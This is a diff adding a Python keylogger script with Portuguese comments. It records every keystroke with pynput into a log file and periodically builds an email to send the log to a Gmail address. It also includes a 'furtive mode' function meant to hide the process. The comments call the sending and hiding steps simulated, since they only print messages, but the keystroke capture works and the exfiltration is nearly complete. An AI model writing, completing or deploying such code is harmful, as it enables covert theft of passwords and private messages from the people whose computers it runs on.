@@ -1,0 +1,96 @@
+import smtplib
+import threading
+from pynput import keyboard
+import time
+import os
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+# Configurações de E-mail (USE CREDENCIAIS DE TESTE, NUNCA REAIS!)
+# Para teste: Crie uma conta fake em serviços como Mailtrap ou SMTP de desenvolvimento.
+SMTP_SERVER = "smtp.gmail.com"  # Ou servidor de teste
+SMTP_PORT = 587
+SENDER_EMAIL = "seu_email_teste@gmail.com"  # Substitua por email de teste
+SENDER_PASSWORD = "senha_falsa"  # NUNCA USE SENHA REAL; para simulação, use app passwords ou services fake
+RECEIVER_EMAIL = "destinatario_teste@gmail.com"
+
+LOG_FILE = "key_log.txt"
+SEND_INTERVAL = 60  # Envia a cada 60 segundos (simulado)
+
+def on_press(key):
+    """Captura teclas pressionadas."""
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"[{key}]")
+
+def send_email():
+    """Envia o log por e-mail (simulado)."""
+    if not os.path.exists(LOG_FILE):
+        return
+    
+    try:
+        # Criar mensagem
+        msg = MIMEMultipart()
+        msg['From'] = SENDER_EMAIL
+        msg['To'] = RECEIVER_EMAIL
+        msg['Subject'] = "Keylogger Log Simulado"
+        
+        with open(LOG_FILE, "r", encoding="utf-8") as f:
+            log_content = f.read()
+        
+        body = f"Log de teclas capturado (simulação):\n\n{log_content[:500]}..."  # Limita tamanho
+        msg.attach(MIMEText(body, 'plain'))
+        
+        # Enviar (simulado - na prática, use try/except para falhas)
+        # Para simulação real: Servidor local ou Mailtrap.io
+        print(f"[+] Log simulado pronto para envio a {RECEIVER_EMAIL}")
+        print(f"Conteúdo: {log_content[:100]}...")
+        
+        # LIMPAR LOG APÓS SIMULAÇÃO
+        open(LOG_FILE, 'w').close()
+        
+    except Exception as e:
+        print(f"[-] Erro no envio simulado: {e}")
+
+def keylogger_thread():
+    """Thread para captura contínua."""
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+def send_thread():
+    """Thread para envio periódico (simulado)."""
+    while True:
+        time.sleep(SEND_INTERVAL)
+        send_email()
+
+def make_furtive():
+    """Torna o processo mais furtivo (simulação)."""
+    # Exemplo: Esconder janela (Windows) ou rodar como daemon (Linux)
+    if os.name == 'nt':  # Windows
+        import subprocess
+        subprocess.CREATE_NO_WINDOW = 0x08000000
+        print("[+] Modo furtivo ativado (Windows)")
+    else:  # Linux
+        print("[+] Modo daemon (Linux) - rode com nohup para background")
+
+def main():
+    make_furtive()
+    print("[*] Keylogger simulado iniciado. Pressione Ctrl+C para parar.")
+    
+    # Iniciar threads
+    key_thread = threading.Thread(target=keylogger_thread, daemon=True)
+    send_thread_obj = threading.Thread(target=send_thread, daemon=True)
+    
+    key_thread.start()
+    send_thread_obj.start()
+    
+    try:
+        key_thread.join()
+    except KeyboardInterrupt:
+        print("\n[*] Keylogger parado.")
+
+if __name__ == "__main__":
+    main()
